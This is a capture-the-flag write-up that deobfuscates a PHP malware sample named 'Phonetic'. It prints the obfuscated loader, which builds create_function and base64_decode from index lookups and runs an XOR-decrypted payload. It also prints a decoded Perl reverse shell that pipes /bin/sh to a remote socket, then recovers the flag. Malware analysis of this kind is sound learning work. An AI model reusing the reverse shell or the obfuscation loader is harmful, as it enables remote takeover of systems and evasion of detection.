# Placeholder

# Phonetic - 362pt
--------------------------------------
## Topic sumary

This problem gives us file `Phonetic`, you can download it [here](https://github.com/Em0t3t/H-cktivityCon-2021-CTF/blob/main/Malware/resources/phonetic) <br>
Open it with notepad++
```php 
<?php  


 function deGRi($wyB6B, $w3Q12 = '') { $zZ096 = $wyB6B; $pCLb8 = ''; for ($fMp3G = 0; $fMp3G < strlen($zZ096);) { for ($oxWol = 0; $oxWol < strlen($w3Q12) && $fMp3G < strlen($zZ096); $oxWol++, $fMp3G++) { $pCLb8 .= $zZ096[$fMp3G] ^ $w3Q12[$oxWol]; } } return $pCLb8; }
/*iNsGNGYwlzdJjfaQJIGRtTokpZOTeLzrQnnBdsvXYlQCeCPPBElJTcuHmhkJjFXmRHApOYlqePWotTXHMuiuNfUYCjZsItPbmUiXSxvEEovUceztrezYbaOileiVBabK*/

$lBuAnNeu5282 = ")o4la2cih1kp97rmt*x5dw38b(sfy6;envguz_jq/.0";
$gbaylYLd6204 = "LmQ9AT8aND16c2AcMh0lCS9BDFtTATklDzA.......";/*a fucking string =))) */
$fsPwhnfn8423 = "";
$oZjuNUpA325 = "";
foreach([24,4,26,31,29,2,37,20,31,6,1,20,31] as $k){
   $fsPwhnfn8423 .= $lBuAnNeu5282[$k];
}
foreach([26,16,14,14,31,33] as $k){
   $oZjuNUpA325 .= $lBuAnNeu5282[$k];
}

/*aajypPZLxFoueiuYpHkwIQbmoSLrNBGmiaDTgcWLKRANAfJxGeoOIzIjLBHHsVEHKTrhqhmFqWgapWrPsuMYcbIZBcXQrjWWEGzoUgWsqUfgyHtbwEDdQxcJKxGTJqIe*/

$k = $oZjuNUpA325('n'.''.''.'o'.''.''.'i'.''.'t'.''.'c'.''.'n'.''.'u'.'f'.''.''.''.''.'_'.''.''.''.'e'.''.'t'.''.'a'.''.'e'.''.''.''.''.'r'.''.''.''.''.'c');
$c = $k("/*XAjqgQvv4067*/", $fsPwhnfn8423( deGRi($fsPwhnfn8423($gbaylYLd6204), "tVEwfwrN302")));
$c();

/*TnaqRZZZJMyfalOgUHObXMPnnMIQvrNgBNUkiLwzwxlYWIDfMEsSyVVKkUfFBllcCgiYSrnTCcqLlZMXXuqDsYwbAVUpaZeRXtQGWQwhcAQrUknJCeHiFTpljQdRSGpz*/
```
---------------------------------------------------------
WTF? are you kidding me =))) <br>
![](https://media.giphy.com/media/aZ3LDBs1ExsE8/giphy.gif)

I run the loops separately. it gives readable results :V
```php
$lBuAnNeu5282 = ")o4la2cih1kp97rmt*x5dw38b(sfy6;envguz_jq/.0";
$fsPwhnfn8423 = "";
foreach([24,4,26,31,29,2,37,20,31,6,1,20,31] as $k){
   $fsPwhnfn8423 .= $lBuAnNeu5282[$k];
}
echo $fsPwhnfn8423; // base64_decode
```
```php
$lBuAnNeu5282 = ")o4la2cih1kp97rmt*x5dw38b(sfy6;envguz_jq/.0";
$fsPwhnfn8423 = "";
foreach([26,16,14,14,31,33] as $k){
   $oZjuNUpA325 .= $lBuAnNeu5282[$k];
}

echo $oZjuNUpA325; // strrev
```
Continue...
```php
echo strrev('n'.''.''.'o'.''.''.'i'.''.'t'.''.'c'.''.'n'.''.'u'.'f'.''.''.''.''.'_'.''.''.''.'e'.''.'t'.''.'a'.''.'e'.''.''.''.''.'r'.''.''.''.''.'c');
//create_function
```
Put together we get
```php
create_function("",base64_decode(deGRi(base64_decode(/*fuckin string*/), "tVEwfwrN302")));
```
Run it and we get another php file =))), it [here](https://github.com/Em0t3t/H-cktivityCon-2021-CTF/blob/main/Malware/resources/phonetic_decode.php)<br>
I'm stuck here.... <br>
After a few minutes (actually hours .-.). I found some base64 strings in source code <br>
A string after decryption, it looks like this
```shell
#!/usr/bin/perl
use Socket;
$iaddr=inet_aton($ARGV[0]) || die("Error: $!\n");
$paddr=sockaddr_in($ARGV[1], $iaddr) || die("Error: $!\n");
$proto=getprotobyname('tcp');
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die("Error: $!\n");
connect(SOCKET, $paddr) || die("Error: $!\n");
open(STDIN, ">&SOCKET");
open(STDOUT, ">&SOCKET");
open(STDERR, ">&SOCKET");
my $str = <<END;
begin 644 uuencode.uu
F9FQA9WLY8C5C-#,Q,V0Q,CDU.#,U-&)E-C(X-&9C9#8S9&0R-GT`
`
end
END
system('/bin/sh -i -c "echo ${string}; bash"');
close(STDIN);
close(STDOUT);
close(STDERR)
```
Do you see it?
```shell
begin 644 uuencode.uu
F9FQA9WLY8C5C-#,Q,V0Q,CDU.#,U-&)E-C(X-&9C9#8S9&0R-GT`
```
![](https://media.giphy.com/media/JqDeI2yjpSRgdh35oe/giphy.gif)

Decode it~~~<br>
`
flag{9b5c4313d12958354be6284fcd63dd26}
`
